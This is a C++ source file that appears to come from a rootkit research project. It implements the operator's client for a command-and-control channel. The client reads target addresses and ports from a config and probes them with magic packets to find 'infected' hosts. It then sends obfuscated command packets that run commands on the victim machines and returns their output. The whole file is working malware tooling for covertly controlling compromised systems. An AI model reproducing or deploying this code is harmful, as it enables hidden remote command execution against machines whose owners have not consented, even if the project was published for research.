/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "SpectreClient.h"

/**
	Constructor for the client.
*/
SpectreClient::SpectreClient (
	_In_ PCONFIGURATION Config
	)
{
	BOOLEAN success;
	this->Configuration = Config;
	this->Obfuscator = NULL;
	this->TargetSocket = NULL;
}

/**
	Free used resources.
*/
SpectreClient::~SpectreClient (
	VOID
	)
{
	if (this->TargetSocket)
	{
		delete this->TargetSocket;
	}
	if (this->Obfuscator)
	{
		delete this->Obfuscator;
	}
}

/**
	Initialize class members from the configuration instance.
	@return TRUE if all config values exist and in valid format, FALSE otherwise.
*/
BOOLEAN
SpectreClient::InitializeConfig (
	VOID
	)
{
	BOOLEAN success;
	std::string portsComma;
	std::istringstream portStream;
	std::string currentPort;
	std::string confirmedPortsComma;
	std::string receiveRetryCount;
	std::string connectTimeout;
	std::string obfuscationCount;

	success = this->Configuration->ReadConfig();
	if (success == FALSE)
	{
		std::cout << "Could not read the config file." << std::endl;
		return FALSE;
	}

	success = this->Configuration->ReadConfigValue<std::string>(TARGET_IP_KEY, &this->TargetIPAddress);
	if (success == FALSE)
	{
		std::cout << "Could not find the target IP Address in the config, please verify the config name." << std::endl;
		return FALSE;
	}

	success = this->Configuration->ReadConfigValue<std::string>(TARGET_PORTS_KEY, &portsComma);
	if (success == FALSE)
	{
		std::cout << "Could not find the target ports in the config, please verify the config name." << std::endl;
		return FALSE;
	}

	//
	// We need to parse each comma to obtain each port.
	//
	portStream.str(portsComma);
	while (std::getline(portStream, currentPort, ','))
	{
		this->Ports.push_back(currentPort);
	}

	//
	// Not a mandatory value.
	//
	success = this->Configuration->ReadConfigValue<std::string>(CONFIRMED_PORTS_KEY, &confirmedPortsComma);
	if (success)
	{
		//
		// We need to parse each comma to obtain each port.
		//
		portStream.str(confirmedPortsComma);
		portStream.clear();
		while (std::getline(portStream, currentPort, ','))
		{
			this->ConfirmedPorts.push_back(currentPort);
		}
	}

	success = this->Configuration->ReadConfigValue<std::string>(RECEIVE_MAX_COUNT_KEY, &receiveRetryCount);
	if (success == FALSE)
	{
		std::cout << "Could not find the receive retry count in the config, please verify the config name and that the config has not been corrupted." << std::endl;
		return FALSE;
	}

	success = this->Configuration->ReadConfigValue<std::string>(CONNECT_TIMEOUT_KEY, &connectTimeout);
	if (success == FALSE)
	{
		std::cout << "Could not find the connect timeout in the config, please verify the config name and that the config has not been corrupted." << std::endl;
		return FALSE;
	}

	success = this->Configuration->ReadConfigValue<std::string>(OBFUSCATION_COUNT_KEY, &obfuscationCount);
	if (success == FALSE)
	{
		std::cout << "Could not find the obfuscation layer count in the config, please verify the config name and that the config has not been corrupted." << std::endl;
		return FALSE;
	}

	this->TargetSocket = new SocketClient(this->TargetIPAddress, std::stoi(receiveRetryCount), std::stoi(connectTimeout));
	this->Obfuscator = new PacketObfuscator(std::stoi(obfuscationCount));
}

/**
	Save the vector of confirmed ports to the config file.
	@return TRUE if saved config successfully, otherwise FALSE.
*/
BOOLEAN
SpectreClient::WriteConfirmedPorts (
	VOID
	)
{
	BOOLEAN success;
	std::string confirmedPortsComma;

	//
	// If the confirmed ports are empty, then there is nothing to save.
	//
	if (this->ConfirmedPorts.size() == 0)
	{
		return TRUE;
	}

	confirmedPortsComma = "";

	//
	// Add every confirmed port with a comma in-between.
	//
	for (std::string Port : this->ConfirmedPorts)
	{
		confirmedPortsComma += Port + ",";
	}

	//
	// Remove the last comma.
	//
	confirmedPortsComma.pop_back();

	//
	// Update the config value.
	//
	this->Configuration->WriteConfigValue<std::string>(CONFIRMED_PORTS_KEY, confirmedPortsComma);
	
	//
	// Write the config to disk.
	//
	success = this->Configuration->WriteConfig();
	if (success == FALSE)
	{
		DBGPRINT("SpectreClient!WriteConfirmedPorts: Failed to open config for writing.");
		return FALSE;
	}
	return TRUE;
}

/**
	Scan the supplied ports to determine if they are infected.
	@return Whether or not scanning yielded any confirmed results.
*/
BOOLEAN
SpectreClient::ScanPorts (
	VOID
	)
{
	BOOLEAN foundInfected;

	foundInfected = FALSE;
	this->ConfirmedPorts.clear();

	//
	// Enumerate every port to determine if it is infected.
	//
	for (std::string Port : Ports)
	{
		if (this->Ping(Port))
		{
			foundInfected = TRUE;
			//
			// Only add the confirmed port if we haven't found it before.
			//
			if (std::find(this->ConfirmedPorts.begin(), this->ConfirmedPorts.end(), Port) == this->ConfirmedPorts.end())
			{
				this->ConfirmedPorts.push_back(Port);
			}
			std::cout << "Port " << Port << " is infected." << std::endl;
		}
		else
		{
			std::cout << "Port " << Port << " is not infected." << std::endl;
		}
	}

	//
	// Write confirmed ports to disk.
	//
	if (this->WriteConfirmedPorts() == FALSE)
	{
		std::cout << "Failed to write confirmed ports to the config file." << std::endl;
	}
	else
	{
		std::cout << "Wrote " << this->ConfirmedPorts.size() << " infected ports to the config file." << std::endl;
	}

	return foundInfected;
}

/**
	Send a Ping request to a target port to determine if it is infected.
	@param Port - The port to connect to.
	@return Whether or not Port is infected.
*/
BOOLEAN
SpectreClient::Ping (
	_In_ std::string Port
	)
{
	BOOLEAN success;
	MAGIC_BASE_PACKET pingPacket;
	std::vector<BYTE> receivedBytes;

	success = TRUE;

	pingPacket.Magic = PACKET_MAGIC;
	pingPacket.Base.Type = PACKET_TYPE::Ping;
	pingPacket.Base.PacketLength = sizeof(pingPacket) - MAGIC_SIZE;

	//
	// Attempt to connect to the port.
	//
	success = this->TargetSocket->AsyncConnect(Port);
	if (success == FALSE)
	{
		goto Exit;
	}

	//
	// Send the ping request.
	//
	success = this->TargetSocket->SendPacket(RCAST<CHAR*>(&pingPacket), sizeof(pingPacket));
	if (success == FALSE)
	{
		goto Exit;
	}

	//
	// Set a reasonable timeout for the victim to respond.
	//
	success = this->TargetSocket->SetReceiveTimeout(PING_RECEIVE_TIMEOUT);
	if (success == FALSE)
	{
		goto Exit;
	}

	//
	// Retrieve the ping response.
	//
	success = this->TargetSocket->ReceivePacket(receivedBytes);
	if (success == FALSE)
	{
		goto Exit;
	}

	//
	// Check for our magic in the response.
	//
	if (receivedBytes.size() < sizeof(PACKET_MAGIC) || *RCAST<DWORD*>(&receivedBytes[0]) != PACKET_MAGIC)
	{
		success = FALSE;
		goto Exit;
	}
Exit:
	this->TargetSocket->Disconnect();
	return success;
}

/**
	Execute a command and retrieve the output.
	@param Command - The command to execute.
	@return The command output, or an empty string on failure.
*/
std::string
SpectreClient::ExecuteCommand (
	_In_ std::wstring Command
	)
{
	BOOLEAN success;
	PGENERIC_BUFFER_PACKET commandPacket;
	PGENERIC_BUFFER_PACKET commandResponsePacket;
	ULONG commandPacketSize;
	std::vector<BYTE> receivedBytes;
	std::string commandOutput;

	success = FALSE;
	commandOutput = "";
	commandPacketSize = GENERIC_BUFFER_PACKET_SIZE(Command.size() * sizeof(WCHAR));
	commandPacket = NULL;

	//
	// Allocate space for the command packet.
	//
	commandPacket = RCAST<PGENERIC_BUFFER_PACKET>(malloc(commandPacketSize));
	if (commandPacket == NULL)
	{
		DBGPRINT("SpectreClient!ExecuteCommand: Failed to allocate space for the command packet.");
		success = FALSE;
		goto Exit;
	}

	memset(commandPacket, 0, commandPacketSize);
	commandPacket->Base.Type = PACKET_TYPE::Command;
	commandPacket->Base.PacketLength = commandPacketSize;
	commandPacket->BufferSize = Command.size() * sizeof(WCHAR);

	//
	// Copy the command into the buffer.
	//
	memcpy(&commandPacket->Buffer, Command.c_str(), Command.size() * sizeof(WCHAR));

	for (std::string Port : this->ConfirmedPorts)
	{
		this->TargetSocket->Disconnect();
		receivedBytes.clear();

		//
		// Attempt to connect to the port.
		//
		success = this->TargetSocket->AsyncConnect(Port);
		if (success == FALSE)
		{
			DBGPRINT("SpectreClient!ExecuteCommand: Failed to connect to port %s.", Port.c_str());
			continue;
		}

		//
		// Send the command request.
		//
		success = this->Obfuscator->SendObfuscatedPacket(this->TargetSocket, RCAST<PBASE_PACKET>(commandPacket));
		if (success == FALSE)
		{
			DBGPRINT("SpectreClient!ExecuteCommand: Failed to send the command packet.");
			continue;
		}

		//
		// Set a long timeout (executing commands takes a decent bit).
		//
		success = this->TargetSocket->SetReceiveTimeout(COMMAND_RECEIVE_TIMEOUT);
		if (success == FALSE)
		{
			DBGPRINT("SpectreClient!ExecuteCommand: Failed to set the receive timeout.");
			continue;
		}

		//
		// Retrieve the command response.
		//
		success = this->TargetSocket->ReceivePacket(receivedBytes);
		if (success == FALSE)
		{
			DBGPRINT("SpectreClient!ExecuteCommand: Failed to receive a response from the target.");
			continue;
		}

		//
		// Sanity check.
		//
		if (receivedBytes.size() < sizeof(GENERIC_BUFFER_PACKET))
		{
			DBGPRINT("SpectreClient!ExecuteCommand: Response only had %i bytes, expected at least %i bytes.", receivedBytes.size(), sizeof(GENERIC_BUFFER_PACKET));
			success = FALSE;
			continue;
		}

		//
		// Cast the vector of bytes to a packet structure.
		//
		commandResponsePacket = RCAST<PGENERIC_BUFFER_PACKET>(&receivedBytes[0]);
		
		commandOutput = std::string(RCAST<CHAR*>(commandResponsePacket->Buffer), commandResponsePacket->BufferSize);
		break;
	}
Exit:
	this->TargetSocket->Disconnect();
	if (commandPacket)
	{
		free(commandPacket);
	}
	return commandOutput;
}